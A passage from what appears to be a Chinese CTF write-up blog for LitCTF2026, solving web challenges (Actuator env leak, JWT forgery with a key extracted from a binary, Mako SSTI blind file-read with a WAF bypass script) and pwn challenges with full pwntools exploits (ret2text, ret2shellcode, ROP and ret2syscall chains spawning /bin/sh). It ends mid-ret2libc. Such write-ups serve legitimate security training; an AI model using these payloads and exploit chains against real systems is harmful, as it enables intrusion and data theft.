+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251315049.png"
+                      alt="img"
+                ></p>
+<p>查看源代码 访问js&#x2F;index.js静态文件</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251315512.png"
+                      alt="img"
+                ></p>
+<ul>
+<li>&#x2F;api&#x2F;public&#x2F;banner - 平台横幅信息</li>
+<li>&#x2F;api&#x2F;public&#x2F;news - 公告列表</li>
+</ul>
+<p>dirsearch爆破出来</p>
+<ul>
+<li>&#x2F;api&#x2F;auth&#x2F;login - 登录接口</li>
+<li>&#x2F;api&#x2F;auth&#x2F;me - 当前用户信息</li>
+<li>&#x2F;actuator</li>
+</ul>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251315900.png"
+                      alt="img"
+                ></p>
+<p>响应展示了所有可用Actuator端点：</p>
+<p>- &#x2F;actuator&#x2F;beans - Bean清单</p>
+<p>- &#x2F;actuator&#x2F;env - 环境变量</p>
+<p>- &#x2F;actuator&#x2F;configprops - 配置属性</p>
+<p>- &#x2F;actuator&#x2F;mappings - 路由映射</p>
+<p>- &#x2F;actuator&#x2F;heapdump - 堆转储</p>
+<p>- &#x2F;actuator&#x2F;threaddump - 线程转储</p>
+<p>访问环境变量  &#x2F;actuator&#x2F;env 得到flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251315360.png"
+                      alt="img"
+                ></p>
+<p>flag：</p>
+<p>flag{kpw4boze-kpyc-4ar-84gq-ttq8vu5mms3di}</p>
+<h2 id="LitCTF2026-lit-reverse-my-web"><a href="#LitCTF2026-lit-reverse-my-web" class="headerlink" title="[LitCTF2026] lit_reverse_my_web"></a>[LitCTF2026] lit_reverse_my_web</h2><p>分析附件，发现这是一个Go语言编写的Web服务器（server.exe）</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251315469.png"
+                      alt="img"
+                ></p>
+<p>访问环境，远程服务是一个企业运营中心，有登录、注册功能</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251315804.png"
+                      alt="img"
+                ></p>
+<p>登录后发现需要更高权限才能访问 &#x2F;flag 页面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251315380.png"
+                      alt="img"
+                ></p>
+<p>登录后获取到JWT token</p>
+<p>解码JWT发现 payload 中有 “role”: “user”，需要将role改为”admin”才能访问flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251316358.png"
+                      alt="img"
+                ></p>
+<p>分析二进制文件，寻找jwt key</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251316621.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251316997.png"
+                      alt="img"
+                ></p>
+<p>密钥被 XOR 0x5a 加密，解密还原出JWT密钥</p>
+<p>rMw_2026_litctf_jwt_secret_key!!</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251316329.png"
+                      alt="img"
+                ></p>
+<p>使用找到的密钥伪造admin权限的JWT token</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251316274.png"
+                      alt="img"
+                ></p>
+<p>使用伪造的token访问 &#x2F;flag 页面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251316063.png"
+                      alt="img"
+                ></p>
+<p>flag：flag{qfyvj1kp-z2sc-4ju-8sai-wsa1cd8ly3qrs}</p>
+<h2 id="LitCTF2026-lit-ezssti"><a href="#LitCTF2026-lit-ezssti" class="headerlink" title="[LitCTF2026] lit_ezssti"></a>[LitCTF2026] lit_ezssti</h2><p>题目名叫 lit_ezssti，描述是“缺什么补什么（x”，页面给了一个模板输入框，POST 参数是 tpl。第一反应是 SSTI，但直接打常见 Jinja2 payload 不生效：</p>
+<p>payload：49</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251317245.png"
+                      alt="img"
+                ></p>
+<p>继续测试危险字符：</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__&#125;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251317680.png"
+                      alt="img"
+                ></p>
+<p>说明后端确实有模板渲染和 WAF，只是模板引擎可能不是 Jinja2，或者表达式分隔符不是<code>&#123;&#123; &#125;&#125;</code>。</p>
+<p>测试 Mako 控制行语法：</p>
+<p>payload</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% <span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">OK</span><br><span class="line">% endif</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251317545.png"
+                      alt="img"
+                ></p>
+<p>再测循环：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">X</span><br><span class="line">% endfor</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251317691.png"
+                      alt="img"
+                ></p>
+<p>所以后端是 Mako 模板注入。Mako 的表达式输出是<code>$&#123;7*7&#125;</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251317947.png"
+                      alt="img"
+                ></p>
+<p>因此不能直接用 ${…} 输出命令结果，需要换成控制流盲注。</p>
+<p>经过测试发现以下关键词会触发WAF</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br><span class="line">.</span><br><span class="line">[]</span><br><span class="line">=</span><br><span class="line">$&#123;...&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>绕过思路：</p>
+<ol>
+<li>flag 拆成字符串拼接：’&#x2F;f’+’lag’</li>
+<li>点号调用 .read() 改成 getattr(…,’read’)()</li>
+<li>下标访问 [i] 改成 getattr(…,’<strong>getitem</strong>‘)(i)</li>
+<li>不用 &#x3D;，判断大小用 &gt; 做二分盲注</li>
+</ol>
+<p>确认文件存在</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% <span class="keyword">if</span> <span class="built_in">getattr</span>(<span class="built_in">open</span>(<span class="string">&#x27;/f&#x27;</span>+<span class="string">&#x27;lag&#x27;</span>),<span class="string">&#x27;read&#x27;</span>)():</span><br><span class="line">Y</span><br><span class="line">% endif</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251317117.png"
+                      alt="img"
+                ></p>
+<p>使用盲注+二分法判断出flag位数是42位</p>
+<p>payload</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% <span class="keyword">if</span> <span class="built_in">len</span>(<span class="built_in">getattr</span>(<span class="built_in">open</span>(<span class="string">&#x27;/f&#x27;</span>+<span class="string">&#x27;lag&#x27;</span>),<span class="string">&#x27;read&#x27;</span>)())&gt;<span class="number">10</span>:</span><br><span class="line">Y</span><br><span class="line">% endif</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2026/png/62866517/1779521467884-ac8c5721-dd6b-413c-b26f-29ba617d195f.png"
+                      alt="img"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251317583.png"
+                      alt="img"
+                ></p>
+<p>然后逐字符读取flag</p>
+<p>因为不能直接输出文件内容，就用 ord() 判断某一位字符 ASCII 值。</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">% <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="built_in">getattr</span>(<span class="built_in">getattr</span>(<span class="built_in">open</span>(<span class="string">&#x27;/f&#x27;</span>+<span class="string">&#x27;lag&#x27;</span>),<span class="string">&#x27;read&#x27;</span>)(),<span class="string">&#x27;__getitem__&#x27;</span>)(<span class="number">0</span>))&gt;<span class="number">100</span>:</span><br><span class="line">Y</span><br><span class="line">% endif</span><br></pre></td></tr></table></figure></div>
+
+<p>exp</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> html</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge.cyclens.tech:31533/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">query</span>(<span class="params">expr</span>):</span><br><span class="line">    tpl = <span class="string">f&quot;% if <span class="subst">&#123;expr&#125;</span>:\nY\n% endif&quot;</span></span><br><span class="line">    data = urllib.parse.urlencode(&#123;<span class="string">&quot;tpl&quot;</span>: tpl&#125;).encode()</span><br><span class="line"></span><br><span class="line">    req = urllib.request.Request(url, data=data, method=<span class="string">&quot;POST&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> urllib.request.urlopen(req, timeout=<span class="number">10</span>) <span class="keyword">as</span> r:</span><br><span class="line">        text = r.read().decode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)</span><br><span class="line"></span><br><span class="line">    m = re.search(<span class="string">r&#x27;&lt;pre id=&quot;out&quot;&gt;(.*?)&lt;/pre&gt;&#x27;</span>, text, re.S)</span><br><span class="line">    out = html.unescape(m.group(<span class="number">1</span>).strip()) <span class="keyword">if</span> m <span class="keyword">else</span> <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> out == <span class="string">&quot;WAF&quot;</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;WAF: &quot;</span> + expr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out == <span class="string">&quot;Y&quot;</span></span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;getattr(open(&#x27;/f&#x27;+&#x27;lag&#x27;),&#x27;read&#x27;)()&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">200</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> query(<span class="string">f&quot;len(<span class="subst">&#123;s&#125;</span>)&gt;<span class="subst">&#123;i&#125;</span>&quot;</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    lo, hi = <span class="number">0</span>, <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> lo &lt; hi:</span><br><span class="line">        mid = (lo + hi) // <span class="number">2</span></span><br><span class="line">        expr = <span class="string">f&quot;ord(getattr(<span class="subst">&#123;s&#125;</span>,&#x27;__getitem__&#x27;)(<span class="subst">&#123;i&#125;</span>))&gt;<span class="subst">&#123;mid&#125;</span>&quot;</span></span><br><span class="line">        <span class="keyword">if</span> query(expr):</span><br><span class="line">            lo = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            hi = mid</span><br><span class="line"></span><br><span class="line">    flag += <span class="built_in">chr</span>(lo)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;FINAL:&quot;</span>, flag)</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251318153.png"
+                      alt="img"
+                ></p>
+<p>flag：flag{6vxzg8a7-cwff-4ww-8xwt-szwfuuk7lowyb}</p>
+<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="LitCTF2026-lit-ret2text32"><a href="#LitCTF2026-lit-ret2text32" class="headerlink" title="[LitCTF2026] lit_ret2text32"></a>[LitCTF2026] lit_ret2text32</h2><p>32位程序，vuln函数存在栈溢出，offest&#x3D;0x38+0x4</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251318497.png"
+                      alt="img"
+                ></p>
+<p>backdoor函数存在</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251318024.png"
+                      alt="img"
+                ></p>
+<p>写脚本，cat flag得到：flag{tkhlcr9k-9yas-4pu-8cid-u2iwn0u4fd8vy}</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251318654.png"
+                      alt="img"
+                ></p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;challenge.cyclens.tech&#x27;</span>, <span class="number">31756</span>)</span><br><span class="line">payload = b<span class="string">&#x27;A&#x27;</span> *(<span class="number">0x38</span> + <span class="number">4</span>) + p32(<span class="number">0x8049213</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&quot;Input: &quot;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="LitCTF2026-lit-integer-overflow"><a href="#LitCTF2026-lit-integer-overflow" class="headerlink" title="[LitCTF2026] lit_integer_overflow"></a>[LitCTF2026] lit_integer_overflow</h2><p>read_data函数， 当输入的 <code>size &gt; 63</code> 时，打印警告信息，但会继续向下执行</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251318466.png"
+                      alt="img"
+                ></p>
+<p>存在后门函数</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251318605.png"
+                      alt="img"
+                ></p>
+<p>写payload，得到flag{itti8hlj-h03z-4oc-8jsp-8yabjt4xuqsnh}</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251318949.png"
+                      alt="img"
+                ></p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;challenge.cyclens.tech&#x27;</span>, <span class="number">31839</span>)</span><br><span class="line">io.sendlineafter(b<span class="string">&#x27;(0-63): &#x27;</span>, b<span class="string">&#x27;80&#x27;</span>)</span><br><span class="line">backdoor_addr = <span class="number">0x004011D8</span></span><br><span class="line">payload = b<span class="string">&#x27;A&#x27;</span> * <span class="number">64</span></span><br><span class="line">payload += b<span class="string">&#x27;B&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(backdoor_addr)</span><br><span class="line">log.info(f<span class="string">&quot;Sending payload, redirecting to: &#123;hex(backdoor_addr)&#125;&quot;</span>)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="LitCTF2026-lit-ret2shellcode"><a href="#LitCTF2026-lit-ret2shellcode" class="headerlink" title="[LitCTF2026] lit_ret2shellcode"></a>[LitCTF2026] lit_ret2shellcode</h2><p>vuln函数，泄露buf的栈地址，read函数存在栈溢出。将shellcode写入buf ，同时覆盖RIP为buf的地址，执行 &#x2F;bin&#x2F;sh 获得 shell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2026/png/63805691/1779506844443-2b0634f4-b2c0-44b4-a1df-356016734ed6.png"
+                      alt="img"
+                ></p>
+<p>得到：flag{367ou267-ghrv-4rs-8xlt-fvxhyw0lllr5q}</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.nlark.com/yuque/0/2026/png/63805691/1779506870295-40437e0e-f2bd-4fba-8e0a-e1771bf16d40.png"
+                      alt="img"
+                ></p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;challenge.cyclens.tech&#x27;</span>, <span class="number">30693</span>)</span><br><span class="line">p.recvuntil(b<span class="string">&#x27;buf is at &#x27;</span>)</span><br><span class="line">buf = <span class="type">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line">log.success(hex(buf))</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">offset = <span class="number">120</span></span><br><span class="line">payload  = <span class="type">shellcode</span></span><br><span class="line"><span class="variable">payload</span>  <span class="operator">=</span> payload.ljust(offset, b<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">payload += p64(buf)</span><br><span class="line">p.sendafter(b<span class="string">&#x27;Leave your mark&#x27;</span>, payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="LitCTF2026-lit-ropchain"><a href="#LitCTF2026-lit-ropchain" class="headerlink" title="[LitCTF2026] lit_ropchain"></a>[LitCTF2026] lit_ropchain</h2><p>vuln函数存在栈溢出，offest&#x3D;0x40+8</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251318926.png"
+                      alt="img"
+                ></p>
+<p>程序里还给了三个ROP gadget：</p>
+<ul>
+<li>pop rdi; ret  -&gt; 0x401166</li>
+<li>pop rsi; ret  -&gt; 0x40116b</li>
+<li>pop rdx; ret  -&gt; 0x401170</li>
+</ul>
+<p>同时有：</p>
+<p>read@plt   &#x3D; 0x401060</p>
+<p>system@plt &#x3D; 0x401040</p>
+<p>.bss       &#x3D; 0x403460</p>
+<p>脚本：栈溢出控制RIP，调用read，把&#x2F;bin&#x2F;sh\x00 写进 .bss，然后再调用system，执行system(“&#x2F;bin&#x2F;sh”)，得到shell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251318169.png"
+                      alt="img"
+                ></p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;challenge.cyclens.tech&#x27;</span>, <span class="number">30719</span>)</span><br><span class="line">OFFSET     = <span class="number">0x40</span> + <span class="number">8</span></span><br><span class="line">POP_RDI    = <span class="number">0x401166</span></span><br><span class="line">POP_RSI    = <span class="number">0x40116b</span></span><br><span class="line">POP_RDX    = <span class="number">0x401170</span></span><br><span class="line">READ_PLT   = <span class="number">0x401060</span></span><br><span class="line">SYSTEM_PLT = <span class="number">0x401040</span></span><br><span class="line">BSS_BUF    = <span class="number">0x403460</span></span><br><span class="line">payload  = b<span class="string">&quot;A&quot;</span> * OFFSET</span><br><span class="line">payload += p64(POP_RDI) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(POP_RSI) + p64(BSS_BUF)</span><br><span class="line">payload += p64(POP_RDX) + p64(<span class="number">8</span>)</span><br><span class="line">payload += p64(READ_PLT)</span><br><span class="line">payload += p64(POP_RDI) + p64(BSS_BUF)</span><br><span class="line">payload += p64(SYSTEM_PLT)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(b<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="LitCTF2026-lit-ret2syscall32"><a href="#LitCTF2026-lit-ret2syscall32" class="headerlink" title="[LitCTF2026] lit_ret2syscall32"></a>[LitCTF2026] lit_ret2syscall32</h2><p>vuln存在栈溢出，offest&#x3D;0x48+4</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251318287.png"
+                      alt="img"
+                ></p>
+<p>ret2syscall 用的 gadget地址如下</p>
+<p>pop eax ; ret              0x080491a6</p>
+<p>pop ebx ; ret              0x080491ab</p>
+<p>pop ecx ; pop ebx ; ret    0x080491b0</p>
+<p>pop edx ; ret              0x080491b6</p>
+<p>mov dword ptr [edx], eax ; ret  0x080491bb</p>
+<p>int 0x80                   0x080491c1</p>
+<p>可写地址用data_buf &#x3D; 0x0804b3a0</p>
+<p>首先用mov [edx], eax，写入”&#x2F;bin&#x2F;sh\x00”，然后执行32 位 Linux syscall：execve(“&#x2F;bin&#x2F;sh”, argv, NULL);</p>
+<p>cat flag得到：flag{rydvth5l-fvpz-4e1-8xjz-jg9hnomhld6md}</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251318162.png"
+                      alt="img"
+                ></p>
+<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;challenge.cyclens.tech&#x27;</span>, <span class="number">30228</span>)</span><br><span class="line">OFFSET = <span class="number">0x48</span> + <span class="number">4</span></span><br><span class="line">DATA_BUF = <span class="number">0x0804B3A0</span></span><br><span class="line"></span><br><span class="line">POP_EAX = <span class="number">0x080491A6</span></span><br><span class="line">POP_EBX = <span class="number">0x080491AB</span></span><br><span class="line">POP_ECX_EBX = <span class="number">0x080491B0</span></span><br><span class="line">POP_EDX = <span class="number">0x080491B6</span></span><br><span class="line">MOV_PTR_EDX_EAX = <span class="number">0x080491BB</span></span><br><span class="line">INT_80 = <span class="number">0x080491C1</span></span><br><span class="line">rop  = b<span class="string">&#x27;&#x27;</span></span><br><span class="line"># 写 <span class="string">&quot;/bin&quot;</span></span><br><span class="line">rop += p32(POP_EDX) + p32(DATA_BUF)</span><br><span class="line">rop += p32(POP_EAX) + b<span class="string">&#x27;/bin&#x27;</span></span><br><span class="line">rop += p32(MOV_PTR_EDX_EAX)</span><br><span class="line"># 写 <span class="string">&quot;/sh\x00&quot;</span></span><br><span class="line">rop += p32(POP_EDX) + p32(DATA_BUF + <span class="number">4</span>)</span><br><span class="line">rop += p32(POP_EAX) + b<span class="string">&#x27;/sh\x00&#x27;</span></span><br><span class="line">rop += p32(MOV_PTR_EDX_EAX)</span><br><span class="line"># 写 argv[<span class="number">0</span>] = data_buf</span><br><span class="line">rop += p32(POP_EDX) + p32(DATA_BUF + <span class="number">8</span>)</span><br><span class="line">rop += p32(POP_EAX) + p32(DATA_BUF)</span><br><span class="line">rop += p32(MOV_PTR_EDX_EAX)</span><br><span class="line"># 写 argv[<span class="number">1</span>] = NULL</span><br><span class="line">rop += p32(POP_EDX) + p32(DATA_BUF + <span class="number">12</span>)</span><br><span class="line">rop += p32(POP_EAX) + p32(<span class="number">0</span>)</span><br><span class="line">rop += p32(MOV_PTR_EDX_EAX)</span><br><span class="line"># execve(<span class="string">&quot;/bin/sh&quot;</span>, argv, NULL)</span><br><span class="line">rop += p32(POP_EAX) + p32(<span class="number">0xb</span>)</span><br><span class="line">rop += p32(POP_ECX_EBX) + p32(DATA_BUF + <span class="number">8</span>) + p32(DATA_BUF)</span><br><span class="line">rop += p32(POP_EDX) + p32(<span class="number">0</span>)</span><br><span class="line">rop += p32(INT_80)</span><br><span class="line">payload = b<span class="string">&quot;A&quot;</span> * OFFSET + rop</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="LitCTF2026-lit-ret2libc"><a href="#LitCTF2026-lit-ret2libc" class="headerlink" title="[LitCTF2026] lit_ret2libc"></a>[LitCTF2026] lit_ret2libc</h2><p>vuln，offest&#x3D;0x40+8</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251318360.png"
+                      alt="img"
+                ></p>
+<p>leak_value，会泄露地址</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://cdn.jsdelivr.net/gh/yzt724/picture/202605251319773.png"
+                      alt="img"
+                ></p>
+<p>一个gadget：</p>
+<p>4011b7: pop rdi</p>
+<p>4011b8: ret</p>
+<p>第一次rop：利用leak_value函数，泄露多个函数在libc中的真实地址</p>
+<p>puts: 0x7e74dc230e50</p>
+<p>printf: 0x7e74dc2106f0</p>
+<p>read: 0x7e74dc2c4850</p>
+<p>setvbuf: 0x7e74dc2315f0</p>
+<p>找到对应的libc版本</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
